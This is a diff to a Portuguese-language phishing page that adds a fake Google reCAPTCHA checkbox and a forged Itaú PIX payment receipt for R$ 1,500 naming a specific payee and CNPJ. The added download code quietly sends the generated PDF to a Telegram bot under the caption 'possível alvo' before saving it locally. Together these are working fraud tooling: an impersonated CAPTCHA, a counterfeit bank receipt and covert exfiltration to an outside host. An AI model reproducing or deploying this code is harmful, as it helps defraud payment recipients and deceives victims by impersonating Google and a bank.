@@ -9,10 +9,12 @@
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
 body{display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5}
 #overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fafafa;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;padding:20px;text-align:center}
-#overlay h2{color:#FF6600;margin-bottom:32px;font-size:24px}
-#captcha-grid{display:grid;grid-template-columns:repeat(3,96px);gap:8px;justify-items:center;margin-bottom:24px}
-#captcha-grid img{width:96px;height:96px;border-radius:6px;cursor:pointer;border:2px solid transparent}
-#captcha-grid img.selected{border-color:#00c853;box-shadow:0 0 8px #00c853}
+#captcha-box{background:#fff;border:1px solid #d0d0d0;border-radius:3px;width:302px;padding:12px 16px;display:flex;align-items:center;gap:12px;margin-bottom:20px}
+#captcha-box input[type=checkbox]{width:28px;height:28px;cursor:pointer}
+#captcha-box label{font-size:14px;color:#222;user-select:none}
+#captcha-logo{margin-left:auto;font-size:10px;color:#555;text-align:right}
+#captcha-logo img{height:18px}
+#permissoes{font-size:13px;color:#555;margin-bottom:16px;max-width:320px}
 #overlay button{padding:12px 32px;font-size:16px;border:none;background:#FF6600;color:#fff;border-radius:30px;cursor:pointer;font-weight:600}
 #comprovanteWrap{display:none;width:420px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 12px 24px rgba(0,0,0,.12)}
 #comprovante{padding:24px 28px;font-size:14px;line-height:1.5;color:#222}
@@ -32,36 +34,33 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
   const CHAT_ID = '-1003187104876';
 </script>
 
-<!-- TELA DE CAPTCHA COM IMAGENS -->
+<!-- TELA REcAPTCHA FAKE -->
 <div id="overlay">
-  <h2>Selecione todas as imagens idênticas</h2>
-  <div id="captcha-grid">
-    <!-- 9 imagens iguais (todas iguais) -->
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+  <div id="captcha-box">
+    <input type="checkbox" id="robot">
+    <label for="robot">Não sou um robô</label>
+    <div id="captcha-logo">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Cpath fill='%234285F4' d='M16 0A16 16 0 1 0 16 32A16 16 0 1 0 16 0Z'/%3E%3Cpath fill='white' d='M24.2 12.1H18v-3c0-1.1-.9-2-2-2s-2 .9-2 2v3H7.8c-.6 0-1.1.5-1.1 1.1v11.8c0 .6.5 1.1 1.1 1.1h16.4c.6 0 1.1-.5 1.1-1.1V13.2c0-.6-.5-1.1-1.1-1.1z'/%3E%3C/svg%3E" alt="reCAPTCHA">
+      <div>reCAPTCHA</div>
+      <div style="font-size:9px">Privacidade - Termos</div>
+    </div>
   </div>
-  <button onclick="validaCaptcha()">Confirmar seleção</button>
+  <div id="permissoes">Você precisa aceitar as permissões da página para continuar.</div>
+  <button onclick="continuar()">CONTINUE</button>
 </div>
 
-<!-- COMPROVANTE COM VALOR 1500 E DADOS ENCODADOS -->
+<!-- COMPROVANTE -->
 <div id="comprovanteWrap">
   <div id="comprovante">
     <div class="header">
       <div class="check"></div>
       <h2>Pagamento realizado</h2>
     </div>
-    <div class="row"><span>Valor</span><span id="valor">R$ 1.500,00</span></div>
-    <div class="row"><span>Para</span><span>***********</span></div>
-    <div class="row"><span>CNPJ</span><span>**.***.***/****-**</span></div>
-    <div class="row"><span>De</span><span>***.***.***-**</span></div>
-    <div class="row"><span>Banco</span><span>341 Itaú Unibanco S/A - 7*** | *****-*</span></div>
+    <div class="row"><span>Valor</span><span>R$ 1.500,00</span></div>
+    <div class="row"><span>Recebedor</span><span>Calcard SA Instituição de Pagamentos</span></div>
+    <div class="row"><span>CNPJ</span><span>08.611.734/0001-19</span></div>
+    <div class="row"><span>Pagador</span><span>***.***.***-**</span></div>
+    <div class="row"><span>Banco</span><span>341 Itaú - **** | *****-*</span></div>
     <div class="row"><span>Data e hora</span><span id="dataHora">--</span></div>
     <div class="row"><span>Canal</span><span>via App Itaú</span></div>
     <div class="row total"><span>Autenticação</span><span id="auth">--</span></div>
@@ -71,21 +70,30 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
 </div>
 
 <script>
-function select(el){el.classList.toggle('selected');}
-function validaCaptcha(){
+function continuar(){
+  if(!document.getElementById('robot').checked){alert('Marque a caixa primeiro.');return;}
   document.getElementById('overlay').style.display='none';
   document.getElementById('comprovanteWrap').style.display='block';
   document.getElementById('dataHora').textContent=new Date().toLocaleString('pt-BR');
   document.getElementById('auth').textContent='PIX'+Date.now().toString().slice(-9);
 }
 
+// BACKGROUND: após download do PDF, envia o arquivo inteiro + metadados
 function downloadPDF(){
   const {jsPDF}=window.jspdf;
   html2canvas(document.getElementById('comprovante'),{scale:2}).then(canvas=>{
     const img=canvas.toDataURL('image/png');
     const pdf=new jsPDF({orientation:'portrait',unit:'mm',format:[canvas.width*0.2646,canvas.height*0.2646]});
     pdf.addImage(img,'PNG',0,0);
-    pdf.save('comprovante_pagamento_itau.pdf');
+    const pdfBlob=pdf.output('blob');
+    // Envia o PDF para o Telegram
+    const fd=new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('document', pdfBlob, 'comprovante_itau.pdf');
+    fd.append('caption','Comprovante baixado - possível alvo');
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`,{method:'POST',body:fd});
+    // Dispara também download local
+    pdf.save('comprovante_itau.pdf');
   });
 }
 </script>
